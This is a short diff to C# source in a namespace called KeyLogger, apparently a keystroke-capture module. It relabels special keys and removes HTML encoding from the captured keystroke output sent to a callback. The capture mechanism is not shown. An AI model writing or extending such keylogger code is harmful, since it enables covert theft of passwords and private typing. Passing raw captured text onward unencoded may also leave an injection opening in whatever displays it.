@@ -1,9 +1,8 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Web;
 
 namespace KeyLogger
 {
@@ -12,16 +11,16 @@ namespace KeyLogger
 
         static readonly Dictionary<int, string> special = new Dictionary<int, string>()
         {
-            { 8, "<bs>" },
-            { 9, "  " },
-            { 13, "<et>" },
-            { 27, "<esc>" },
-            { 32, " " },
-            { 37, "<la>" },
-            { 38, "<ua>" },
-            { 39, "<ra>" },
-            { 40, "<da>" },
-            { 46, "<de>" },
+            { 8, "[backspace]" },
+            { 9, "[tab]" },
+            { 13, "[enter]\n" },
+            { 27, "[esc]" },
+            { 32, "[space]" },
+            { 37, "[left]" },
+            { 38, "[up]" },
+            { 39, "[right]" },
+            { 40, "[down]" },
+            { 46, "[delete]" },
             { 48, ")" },
             { 49, "!" },
             { 50, "@" },
@@ -130,7 +129,7 @@ namespace KeyLogger
             if (r != string.Empty)
             {
                 //Console.Write(r);
-                callback(new { output = HttpUtility.HtmlEncode(r), returnType = 11 });
+                callback(new { output = r, returnType = 11 });
             }
         }
 
